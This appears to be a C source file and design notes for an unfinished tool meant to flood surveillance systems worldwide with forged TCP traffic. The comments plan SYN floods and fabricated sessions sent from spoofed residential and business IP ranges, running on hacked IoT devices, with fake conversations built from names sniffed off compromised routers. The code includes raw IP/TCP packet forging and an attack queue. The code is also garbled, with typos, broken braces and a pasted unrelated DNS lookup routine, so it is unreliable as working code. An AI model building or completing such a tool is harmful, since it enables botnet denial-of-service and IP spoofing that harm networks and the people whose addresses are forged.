/*

this is the main file which takes care of DoS against surveillance platforms worldwide
it is meant to exhaust CPU, memory, and possibly pipes/linked relationships... it will be
three staged (released/versioned) ... first is just to stop connections from being monitored
then itll go further (due to the possible ways to fix that issue) although i plan to release
all possible scenarios as soon as possible.. in other words: plan for every possible fix...
since these hackish systems use fiber taps etc then there will always be a way to disrupt them
and as long as this code continously runs on several machines then ... no more surveillance

*/

/*
discovery:
all major sites (prism related, facebook, those kinds) in a list
DNS them all.. and begin to reverse their ranges, and analyze traceroutes to find ones with same hops
to ensure its either in the same datacenter, or closse to it

for DNS it should randomize between google, and other top providers an dthe local provider (it can attempt to DNS fromm all
local hosts as a third of its requests)

generate residential IPs using geoip

generate business IPs using geoip (and a list of worldwide isp providers)

https://www.maxmind.com/en/geoip2-isp-database - $100 for all business ip ranges...
perfect for this.


https://www.maxmind.com/en/geoip2-enterprise-database - even better...
covers all non residential

IANA/whois info could be used (but dont put code to look anything up)

attack:

stage 0-1: IPv6 support... can reuse the same logic structures.. it shouldnt be hard to add...
the main concern iss the IP ranges (harder to scan) but DNS, etc and the same research mechaniss will work
i just dont know if geoip works the same


stsage 1 - syn (not virtual connections) floods using alll of the ranges (but we can virtualize a respoonse from the server
so that it takes up a structure inside of the surveillance platforms)
their first response will be to count a few packets such as 5 before it prioritizes so this should be variable and increase over time
(increase suuch as falsifying more packets per connection as months go on fromm release)

stage 2-  full blown requests using either local network information regarding top sites (non ssl) but with macros being used
to replace information... most used names can be found easily to be integrated for most languages online (top birth names in countries)
and then terrorists, or lists of government employees either captured from www or local network (libpcaap on these routers since its ioT)
could be used to create automatic local lists of macro replacements for the falsifyed connections


stage 3- doing separate sides of the session using multiple hosts across the globe guaranteed to ensure it is son both sides of the tap
this is the LAST possible way that the surveillance platforms can attempt to detect the situations..
and ...its going to be SO CPU intensive, and annoying due to BGP routing and many other factors.. think multicast, anycast,
and just protocol gibberish... yeah.. but itll be prepared anyhow.


------
at some stage the surveillance systems are going to start randomly accepting connections by some % and only adding them to a permanent
list if they contain actionable intelligence which means that if you declare enough real connections (full sessions) captured and replayed
to autheticate host/ips then it will begin to delegate the falsified ones as well

icmpp messages such as redirect and host not available, ad port not available could also affect these serviecs

-----

*/
/*
geoip [ 

    residential finder - generate & verify IPs within particular countries (first world, high intelligene gathering, etc)

    business IP finders - generate & verify ips in certain industries.. whois/http/dns (dfense, cyber, ads, etc)

    corporate discovery - generate ips for facebook, google, microsoft, etc (all past prism/major online resources, and expected ones now)
    (top few thousands websites should be enough)
]

geoip = 6megs default

posssible to extract top countries out of the database and use solely those.. it should lower it to below a megabyte
and using our own algorithm would help even further



dns (host -t MX, NS, etc) for top sites (to generate enough connections to overrun their capturing scenarios for mail,etc)



traceroute (to ensure it goes through enough hops for the hosts that were generated) which meaans itll pass through the fiber
needss to vereify both sides, source and dest.. then 1 single box can attack and due to rouutinng, bgp and world wide
itll work just as fine as having two boxes working together on other parts of the world

picking hosts near the dest/source host might be smart as well..to ensure it doesnt give away information to these systems
in case they use this tracing scenario to attempt to block or mitigate these attackers


list of protocols
http smtp pop ssl vpn smtp ssh dns (each need to be equally hit to ensure it funnctions for all NSA selectors fromm leaks)

packet generators (lots around)
syn flood, virtual tcp connections (much eaier now that we do not need both sides of the tap)


----
emulation of some packet loss at times may be smart to implement especially over lots of connections (if a score base system
isnt sure then havinng somme situations like this only helps)



*/

#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <getopt.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <fcntl.h>
#include <resolv.h>
#include "structs.h"
#include <list.h>
#include "utils.h"
#include "anti_surveillance.h"


// declarations
unsigned short in_cksum(unsigned short *addr,int len);




// queue for futher requests to the DNS lookup which will populate IPs for major sites, and corporations
// it should find mail servers, name servers, and other IPs related to these companies which  are different
// from the front facing sites
// it should also allow a spider once these ips are done being used or increase (over months or time) to automatically
// spider the IPs, and reverse then continue adding all ranges/data centers related
// this would allow the software to adapt to how governments will begin to block this attack
// depending on intelligence lost they may attempt to block quickly but id expect it shoud increase by 3-6months
// for spidering all geoip data centers for every major site

// thiis should also lookup residential IPs generated in countries using geoip...
// this information should be cached so the same IoT bot doesnt have to continously look it up
// a system for distributing over p2p could work for this as well but it should verify 10% and immediately
// disqualify p2p if it finds someone is attempting to infect it wiith bad information
// inn that case, they could all scan IPv4 ranges for open DNS servers (simple to do) and then
// share sevveral, or find their own and attempt to get real results

// also it could automaticallly scan and find dns servers in geoip regions to ensure it obtains the correct data centers
// for appllying the attack to that region

enum {
        // can auto append www. to most just to grab that
        DNS_WWW,
        DNS_MX,
        DNS_NS,
        DNS_A,
        DNS_PTR    
};


// queued dns requests (getting prepared to go to wire)
DNSQueue *dns_queue = NULL;

// responsses from DNS requests which can be used for future attacks on particular sites such as facebook, etc
DNSRecord *dns_records = NULL;


// dns (MX, NS, PTR, etc)
//https://stackoverflow.com/questions/1093410/pulling-mx-record-from-dns-server
// ensure it works across all IoT and systems


int main (int argc, char *argv[])
{
    u_char nsbuf[4096];
    char dispbuf[4096];
    ns_msg msg;
    ns_rr rr;
    int i, j, l;

    if (argc < 2) {
        printf ("Usage: %s <domain>[...]\n", argv[0]);
        exit (1);
    }

    for (i = 1; i < argc; i++) {
        l = res_query (argv[i], ns_c_any, ns_t_mx, nsbuf, sizeof (nsbuf));
        if (l < 0) {
            perror (argv[i]);
        } else {
#ifdef USE_PQUERY
/* this will give lots of detailed info on the request and reply */
            res_pquery (&_res, nsbuf, l, stdout);
#else
/* just grab the MX answer info */
            ns_initparse (nsbuf, l, &msg);
            printf ("%s :\n", argv[i]);
            l = ns_msg_count (msg, ns_s_an);
            for (j = 0; j < l; j++) {
                ns_parserr (&msg, ns_s_an, j, &rr);
                ns_sprintrr (&msg, &rr, NULL, NULL, dispbuf, sizeof (dispbuf));
                printf ("%s\n", dispbuf);
            }
#endif
        }
    }

    exit (0);
}

enum {
    ATTACK_SYN,
    ATTACK_SESSION,
    ATTACK_END
};

ResearchInfo *research_list = NULL;
AS_attacks *attack_list = NULL;


// this is flushed to wire as quickly as possible...
// this allows using a separate thread to ensure speed is fast enough
// in that case we shouldnt affect the attack_info from another thread
// without mutex, etc but it might not be worth it
AttackOutgoingQueue *wire_queue = NULL;


/*

this will put a packet (needs eth frame for this operation) directly into outgoing queue
ok so one thing to consider in the future
its possible that 2 packets of the same attack get sent too close together... itd be nice to have them separated by frames
it might be smart to use an array when adding where one outgoing queue will move the next one into the current positon after
it flushes hte buffer.. for now i wont deal with it... but it can either be done by
adding a variable with a wait count (one loop each decrement) before it sends the packet so it can
queue future packets which wonot get sent till next iteratioon.. ill work this out in a bit
i dont think its important until the analysis parts of attempting to block the attacks come into pllay
ive pretty much thought of every possible way to fix all of these attacks, and ... its impossible to solve for good.

*/
int AS_queue(char *buf, int size, AS_attacks *attack) {
    AttackOutgoingQueue *optr = NULL;

    if ((optr = (AttackOutgoingQueue *)calloc(1,sizeof(AttackOutgoingQueue)) == NULL)
        return -1;
    
    // we pass the pointer so its not going to use CPU usage to copy it again...
    // the calling function should release the pointer (set to NULL) so that it doesnt
    // free it too early
    optr->buf = buf;
    optr->size = size;
    optr->attack_info = attack;

    return 1;
}


// *** strategy for repeat_interval needs to be worked into an algorithm taking considering of how long this system is released
// it needs to progressively use more resources over time
// this isnt just for a simple SYN (one packet trying to open a port)
// depth will allow to go the entire handshake... 
// the point is initially that the systems wont be prepared for these kinds of attacks...
// but a start date will get put in (prob nov 4-5) which will be the date fromm when the depth will be calculated
// after full connectioons are established (depth = 3) then it will rely on virtual connections as well
// **
// so do we generate session pacets into an array.. and then push to this function??
//.....

int AS_session_queue(int id, uint32_t src, uint32_t dst, int src_port, int dst_port, int count, int interval, int depth) {
    AS_attacks *aptr = NULL;

    aptr = (AS_attacks *)calloc(1, sizeof(AS_attacks));
    if (aptr == NULL)
        return -1;

    aptr->id = id;

    aptr->src = src;
    aptr->dst = dst;
    aptr->src_port = src_port;
    aptr->dst_port = dst_port;


    aptr->type = ATTACK_SESSION;

    aptr->count = count;
    aptr->repeat_interval = interval;

    aptr->next = attack_list;
    attack_list = aptr;

    return 1;
}

// thiis is going to be an entire new category.. poossibly with scripting languages to call lua, python, or other scripts
// or grab data remotely for creatinng conversatioons over time being pushed into these surveillance platforms
// full manipulation... like i said nsa aint ready
// this needs to be paired diretly with AS_session_queue() and other possible queues...
// for some people we wanna perform full blown emulation from DNS (with correct TTL) to third party browser connections
// to fake SSL, or possibly replaying some other SSL, or generating some SSL connections remotely, or locally for this
// by means of openssl etc
// it really  wont take much.. one line at a time and soon everything will make sense.
// there will be ZERO way to block this whenever its completed.
// **** linkk this directly to botlink....
void PacketsAdjustment(AS_attacks *aptr) {
    return;
}


void PacketQueue(AS_attacks *aptr) {
    int ts = time(0);
    PacketInfo *pkt = NULL;

    // if its already finished.. lets just move forward
    if (aptr->completed) return;

    // onoe of these two cases are correct fromm the calling function
    if (aptr->current_packet != NULL)
        pkt = aptr->current_packet;
    else {
        // we do have to reprocess these packets fromm packet #1?
        if (aptr->count == 0) {
            // lets free the packets....we dont have anymore times to push to wire...
            PacketsFree(&aptr->packets);
    
            aptr->current_packet = NULL;
            aptr->packets = NULL;
            aptr->completed = 1;
    
            return;
        }

        // lets start it over..
        pkt = aptr->packets;        
    }

    if (pkt == NULL) {
        // error shouldnt be here...
        aptr->completed = 1;

        return;
    }
    
    // is it the first packet?
    if (pkt == aptr->packets) {
        // by here we have more counts to start this session over.. lets ensure its within the time frame we set
        // remember on the first time.. the ts is 0 so this will never mistake that it hasnt been enough time
        // subtracting 0 from epoch
        if ((ts - aptr->ts) < aptr->repeat_interval) {
            // we are on the first packet and it has NOT been long enough...
            return;
        }

        // derement the count..
        aptr->count--;

        // later.. sinnce this is the first packet.. we need to allow modifications using particular ranges (such as source ports, etc)
        // it would go here.. :) so it can modify quickly before bufferinng againn... IE: lots of messages to social sites, or blogs..
        // could insert different messages here into the session and prepare it right before the particular connection gets pushed out
        PacketAdjustments(aptr);
    }

    // queue this packet (first, or next) into the outgoing buffer set...
    AS_queue(pkt->buf, pkt->size, aptr);

    // lets prepare the next packet (if it exists.. otherise itll complete)
    aptr->current_packet = pkt->next;

    // we set the ts to the time of the last packet submission.. this way the separation is by the messages being completed..
    // this can allow full blown  simulated conversations being pushed directly into intelligence platforms to manipulate them
    // ie: generate text, neural network verify it seems human vs not, then randomly choose whne the two parties would be online together,
    // or not.. it can keep context information about parties (even possibly transmitted over p2p to keep on somme remote server for IoT hacked devices
    // to reload..)
    // this could allow using simulated messages where two parties arent even online at the same time but send small messages...
    // all of this couldd be trained, automated and directed to fconfuse manipulate or disrupt intelligence platforms...
    // thats why this timestamp is extremely impoortant ;)
    aptr->ts = ts;

    return;
}

// remove completed sessions
void AS_remove_completed() {
    AS_attacks *aptr = attack_list, *anext = NULL;

    while (aptr != NULL) {
        if (aptr->completed == 1) {
            anext = aptr->next;

            PacketsFree(&aptr->packets);

            free(aptr);

            aptr = anext;
            continue;
        }

        aptr = aptr->next;
    }

    return;
}

// perform one iteration of each attack
int AS_perform() {
    AS_attacks *aptr = attack_list;

    while (aptr != NULL) {
        if (aptr->completed == 0) {
            // if we dont have any prepared packets.. lets run the function for this attack
            if (aptr->packets == NULL) {
                // call the correct function for performing this attack to build packets.. it could be the first, or some adoption function decided to clear the packets
                // to call the function again
                aptr->attack_func(aptr);
            }

            // if we have packets queued.. lets handle it.. logic moved there..
            if ((aptr->current_packet != NULL) || (aptr->packets != NULL))
                PacketQueue(aptr);
            } else {
                aptr->completed = 1;
            }
        }

        aptr = aptr->next;
    }

    // every loop lets remove completed sessions... we could choose to perform this every X iterations, or seconds
    // to increase speed at times.. depending on queue, etc
    AS_remove_completed();

    return 1;
}


/* took some packet forging stuff I found online, and modified it...
   It was better than my wireshark -> C array dumping w memcpy... trying to hack this together as quickly as possible isnt fun :)

   /*!	forgetcp.c
 * 	\Brief Generate TCP packets
 * 	\Author jve
 * 	\Date  sept. 2008
*/

/*
notes from wireshark analysis:

--------------------------------------
a web server connection.. in separated packets.. the entire connection from connection establishment to closing.. (including data)
(this will be a huge portion of the packets)... so 
simplle inn the end...
a simple linked list of 8 packets (or more depending on size) and thats all you need to destroy sigint 
worldwide.. (obviously this same scenario repeated over and over)...
but in the end.. itll be less than 1500 lines of code.  and these guys didnt take the papers
alone seriously? like i said.. intelligence agency are about to be as uninteligent as they seem to be
with my life.


packet connection 1 - SYN, gen seq, ack 0, options gen timestamp+max seg size 1460 (verify)
SYN
SEQ 100
ACK 0
options maxx seg size (MTU?)

packet c 2 server ack conn - seq its own, ack initial seq+1, SYN,ACK   *options max seg 1460+timestamp (verify... window scale 6 by 64)
connected now..
SYN,ACK
SEQ 200
ACk 101
options maxx seg size (MTU?)

data packet to server - total len, ident 0x3751..., TCP hdr32 ttl 64, TCP 0x018 PSH+ACK, window size..., *optionss timestamp
server ack dat packet - ident 0x9528, ttl 53, seq ack+1, ack +81 of last seq, flags ACK, window size 
, *ops timestamp
ident 0x3751 (find ones for prior conns too)
PSH+ACK
SEQ 102
ACK 281
window size
options timestamp


server responding to client - total len 911, ident 0x9529, ttl 53, seq ack+1(next 860), ack 81(same since no changes), hdr 32, flags PSH+ACK, window size 453, *options Timestamps..
client ack packet fromm sserver - total len 52, ident 0x3752, ttl 64, tcp: seq 81, ack 860 flags ACK window 242, *options timestamp
PSH+ACK
ident 0x9529
SEQ 282
ACK 281 (no change)
options stimestamp
window size


-- ... ... more packets...
new data packets could be insertged here just like the last one.. since the last one used the prior packets ack/seq (meaning no changes...
so they were both  waiiting for sommething to happen.. server's application layer found the webpage)
--
server sending back the same exact type of packet (assuming the OS sends it even if the opposite side already has.. it prob got a recv -1 in the app layer.. then decided to closesocket(fd) and the OS must want to be sure (im noot reading protocol just using packets... i never cared to know this part only injection before)

--

client closing connection - len 522, ident 0x3753, ttl 64, tcp seq 81 ack 860 flags FIN+ACK, window size 242, *options timestamp
FIN+ACK
ident 0x3753
SEQ 281 (same no change)
ACK ??860 (verify the changes.. i crfeated 100 and 200 for this)
winndow size
options timestamp


server sending back ACK+FIN - len 52, ident 0x952a ttl 53 TCP seq 860 ACK 82 flags FIN+ACK window value 453 *options timestamp
ACK+FIN
ident 0x952a
SEQ 860
ACK 282
window value
options timestamp

last packet fromm client to server ACK its FIN - len 52 ident 0x3754, ttl 64, TCP seq 82 ack 861 flags ACK window size 242 *options timemstamp
FIN
ident 0x3754
SEQ 282
ACK ??861 caccualte + verify
window size
options timestamp


-----------------------------------------

*/
VirtualConnection *session_connections = NULL;


/*
NS (1 bit): ECN-nonce - concealment protection (experimental: see RFC 3540).
CWR (1 bit): Congestion Window Reduced (CWR) flag is set by the sending host to indicate that it received a TCP
 segment with the ECE flag set and had responded in congestion control mechanism (added to header by RFC 3168).
ECE (1 bit): ECN-Echo has a dual role, depending on the value of the SYN flag. It indicates:
If the SYN flag is set (1), that the TCP peer is ECN capable.
If the SYN flag is clear (0), that a packet with Congestion Experienced flag set (ECN=11) in IP header was received
 during normal transmission (added to header by RFC 3168). This serves as an indication of network congestion
  (or impending congestion) to the TCP sender.
URG (1 bit): indicates that the Urgent pointer field is significant
ACK (1 bit): indicates that the Acknowledgment field is significant. 
All packets after the initial SYN packet sent by the client should have this flag set.
PSH (1 bit): Push function. Asks to push the buffered data to the receiving application.
RST (1 bit): Reset the connection
SYN (1 bit): Synchronize sequence numbers. 
Only the first packet sent from each end should have this flag set. Some other flags and fields change meaning based on this flag, and some are only valid for when it is set, and others when it is clear.
FIN (1 bit): Last packet from sender.
*/

// like this so we can use bitwise type scenarios even though its integer.. if & and flags |= FLAG_...
enum {
    TCP_WANT_CONNECT=1,
    TCP_CONNECT_OK=2,
    TCP_ESTABLISHED=4,
    TCP_TRANSFER=8,
    TCP_FLAG_NS=16,
    TCP_FLAG_CWR=32,
    TCP_FLAG_ECE=64,
    TCP_FLAG_URG=128,
    TCP_FLAG_ACK=256,
    TCP_FLAG_PSH=512,
    TCP_FLAG_RST=1024,
    TCP_FLAG_SYN=2048,
    TCP_FLAG_FIN=4096,
    TCP_OPTIONS_WINDOW=8192,
    TCP_OPTIONS_TIMESTAMP=16384
};


// build packets relating to a set of instructions being passed
// fromm somme other function which generated the session(s)
void BuildPackets(PacketBuildInstructions *iptr) {
    while (iptr != NULL) {
        if (BuildSinglePacket(iptr) == 1) {
            iptr->ok = 1;
        }
        iptr = iptr->next;
    }
}


//https://tools.ietf.org/html/rfc1323
int PacketBuildOptions(PacketBuildInstructions *iptr, int flags) {
    // need to see what kind of packet by the flags....
    // then determine which options are necessaray...
    // low packet id (fromm 0 being syn connection) would require the tcp window size, etc

    // options are here static.. i need to begin to generate the timestamp because that can be used by surveillance platforms
    // to attempt to weed out fabricated connections ;) i disabled it to grab this raw array
    unsigned char options[12] = {0x02, 0x04,0x05, 0xb4, 0x01, 0x01, 0x04, 0x02, 0x01, 0x03,0x03, 0x07};
    // this is preparing for when we have dynamic options...
    char *current_options = (char *)options;
    int current_options_size = 12;

    if (current_options == NULL) return -1;

    iptr->options_size = currnet_options_size;
    iptr->option = current_options;

    return 1;
}




int BuildSinglePacket(PacketBuildInstructions *iptr) {
    int ret = -1;


    // calculate full length of packet.. before we allocate memory for storage
    int final_packet_size = TCPHSIZE + iptr->options_size + iptr->data_size;

    unsigned char *final_packet = (unsigned char *)calloc(1,final_packet_size);
    struct packet *p = (struct packet *)final_packet;

    // ip header.. 
    p.ip.version 	= 4;
    p.ip.ihl 	= IPHSIZE >> 2;
    p.ip.tos 	= 0;
    
    // thiis id gets incremented similar to ack/seq (look into further later)
    // it must function properly like operating systems (windows/linux emulation needed)
    // itll take weeks or months to updaate systems to actually search for this and determine differences
    // and thats IF its even possible (due to their implementation having so much more data
    // than possible to log... it must make decisions extremely fast)  ;) NSA aint ready.
    p.ip.id 	= htons(iptr->header_identifier);

    // this can also be used to target the packets... maybe changee options per machine, or randomly after X time
    // i believe this is ok.. maybe allow modifying it laater so operting  system profiles could be used
    p.ip.frag_off 	= 0x0040;
    
    p.ip.ttl 	= iptr->ttl;
    p.ip.protocol 	= IPPROTO_TCP;
    p.ip.saddr 	= iptr->source_ip;
    p.ip.daddr 	= iptr->destination_ip;

    // tcp header
    // we want a function to build our ack seq.. it must seem semi-decent entropy.. its another area which
    // can be used later (with a small.. hundred thousand or so array of previous ones to detect entropy kindaa fast
    // to attempt to dissolve issues this system will cause.. like i said ive thought of all possibilities..)
    // ***
    p.tcp.ack_seq	= htonl(atoi("11111"));
    p.tcp.urg	= 0;
    
    // syn/ack used the most
    p.tcp.syn	= (iptr->flags & TCP_FLAG_SYN);
    p.tcp.ack	= (iptr->flags & TCP_FLAG_ACK);

    // push so far gets used when connection gets established fromo sserver to source
    p.tcp.psh	= (iptr->flags & TCP_FLAG_PSH);
    // fin and rst are ending flags...
    p.tcp.fin	= (iptr->flags & TCP_FLAG_FIN);
    p.tcp.rst	= (iptr->flags & TCP_FLAG_RST);

    // window needs to also be dynamic with most used variables for operating systems...
    // it should have a dynamic changing mechanism (15-30% for each, and then remove, or add 3-5% every few minutes)
    p.tcp.window	= htons(iptr->window_size);
    
    p.tcp.check	= 0;	/*! set to 0 for later computing */
    
    p.tcp.urg_ptr	= 0;
    
    p.tcp.source = htons(iptr->source_port);
    p.tcp.dest = htons(iptr->destination_port);

    // total length
    p.ip.tot_len = final_packet_size;

    // these must be in order before the instructions are sent to this function
    p.tcp.seq = htonl(iptr->seq);
    p.tcp.ack = htonl(iptr->ack);


    p.tcp.doff 	= TCPHSIZE >> 2;

    // ip header checksum
    p.ip.check	= (unsigned short)in_cksum((unsigned short *)&p.ip, IPHSIZE);

    // tcp header checksum
    if (p.tcp.check == 0) {
        /*! pseudo tcp header for the checksum computation
            */
        struct pseudo_tcp p_tcp;
        memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

        p_tcp.saddr 	= p.ip.saddr;
        p_tcp.daddr 	= p.ip.daddr;
        p_tcp.mbz 	= 0;
        p_tcp.ptcl 	= IPPROTO_TCP;
        p_tcp.tcpl 	= htons(TCPHSIZE);
        memcpy(&p_tcp.tcp, &p.tcp, TCPHSIZE);

        /*! compute the tcp checksum
            *
            * TCPHSIZE is the size of the tcp header
            * PSEUDOTCPHSIZE is the size of the pseudo tcp header
            */
        p.tcp.check = (unsigned short)in_cksum((unsigned short *)&p_tcp, TCPHSIZE + PSEUDOTCPHSIZE);
    }

    // prepare the final packet buffer which will go out to the wire
    memcpy(final_packet, p, sizeof(struct packet));
    if (iptr->current_options_size)
        memcpy(final_packet + sizeof(struct packet), iptr->current_options, iptr->current_options_size);
    memcpy(final_packet + sizeof(struct packet) + iptr->current_options_size, iptr->data, iptr->data_size);
    

    iptr->packet = final_packet;
    iptr->packet_size = final_packet_size;

    // we need too keep track of whch packet number thi is for which session
    // to help do certaini things like ack/seq, modify later,, etc

    // so iptr->ok gets set...
    return 1;
}


// calculate checksum
unsigned short in_cksum(unsigned short *addr,int len) {
	register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;

        /*!
	* Our algorithm is simple, using a 32 bit accumulator (sum), we add
	* sequential 16 bit words to it, and at the end, fold back all the
	* carry bits from the top 16 bits into the lower 16 bits.
	*/
	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	/*! mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	/*! add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);     /*! add hi 16 to low 16 */
	sum += (sum >> 16);                     /*! add carry */
	answer = ~sum;                          /*! truncate to 16 bits */
	return(answer);
}

